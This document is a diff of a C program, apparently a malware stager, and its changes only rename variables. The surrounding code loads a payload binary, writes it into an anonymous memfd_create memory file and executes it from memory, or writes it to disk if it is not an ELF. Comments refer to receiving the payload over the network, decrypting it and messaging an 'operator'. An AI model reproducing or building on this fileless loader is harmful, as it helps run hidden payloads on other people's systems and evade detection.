@@ -38,8 +38,8 @@ int executePayload(int payload_fd, char **payload_argv, char **payload_envp){
 /*
     Simply write payload to given file name
 */ 
-void write_to_disk(void *payload, char *path_to_write, int size){
-    FILE *outfile = fopen(path_to_write, "w");
+void write_to_disk(void *payload, char *pathToWrite, int size){
+    FILE *outfile = fopen(pathToWrite, "w");
     fwrite(payload, sizeof(char), size, outfile);
     fclose(outfile);
 }
@@ -48,14 +48,14 @@ int main(int argc, char **argv){
     void *payload;
     void *decrypted;
     void *decompressed;
-    FILE *payload_file; // to hold payload file pointer, remove in final deliverable
+    FILE *payloadFile; // to hold payload file pointer, remove in final deliverable
     int size; // to hold file size, remove in final deliverable
-    int payload_fd; // in memory file descriptor
-    int write_return_size;
+    int payloadFD; // in memory file descriptor
+    int writeReturnSize;
     int d; //to hold the return value of detect()
     char * payload_argv[] = {"../test_files/test_ELF", "testing", NULL}; // argv for payload
     char * payload_envp[] = {NULL}; // envp for payload
-    char *path_to_write = "../test_files/test_static_copy";
+    char *pathToWrite = "../test_files/test_static_copy";
      
 /*
     while(receive(payload) != 0){
@@ -68,35 +68,35 @@ int main(int argc, char **argv){
     execute(decrypted);
 */
     
-    payload_file = fopen(PAYLOAD_FILE, "r"); // open payload binary
-    size = fsize(payload_file); // get size in bytes
+    payloadFile = fopen(PAYLOAD_FILE, "r"); // open payload binary
+    size = fsize(payloadFile); // get size in bytes
     payload = calloc(size, sizeof(unsigned char)); // allocate on heap
-    fread(payload, sizeof(unsigned char), size, payload_file); // read file to heap
-    fclose(payload_file); //close file
+    fread(payload, sizeof(unsigned char), size, payloadFile); // read file to heap
+    fclose(payloadFile); //close file
 
 
-    while ((payload_fd = memfd_create("payload", 0)) <= 2){ // create memory file descriptor for execution
-        printf("memfd_create() failed. File descriptor created: %d\n", payload_fd);
-        close(payload_fd);
+    while ((payloadFD = memfd_create("payload", 0)) <= 2){ // create memory file descriptor for execution
+        printf("memfd_create() failed. File descriptor created: %d\n", payloadFD);
+        close(payloadFD);
         return -1;
     }
     // read_payload(payload_fd); // read payload file over network into payload's file descriptor
 
-    write_return_size = write(payload_fd, payload, size);  // write to mem_fd and error check
-    if (write_return_size != size){
-        printf("Writing to mem_fd failed. %d bytes written when %d bytes were supposed to be written.\n", write_return_size, size);
+    writeReturnSize = write(payloadFD, payload, size);  // write to mem_fd and error check
+    if (writeReturnSize != size){
+        printf("Writing to mem_fd failed. %d bytes written when %d bytes were supposed to be written.\n", writeReturnSize, size);
         return -1;
     }
 
     d = detect((unsigned char *)payload); //determine if the payload is an executable/ELF
 
     if (d == 1){
-        if (executePayload(payload_fd, payload_argv, payload_envp) == 0){
+        if (executePayload(payloadFD, payload_argv, payload_envp) == 0){
             //send message to operator
             return -1;
         } 
     } else {
-        write_to_disk(payload, path_to_write, size);
+        write_to_disk(payload, pathToWrite, size);
     }
 
     return 0;
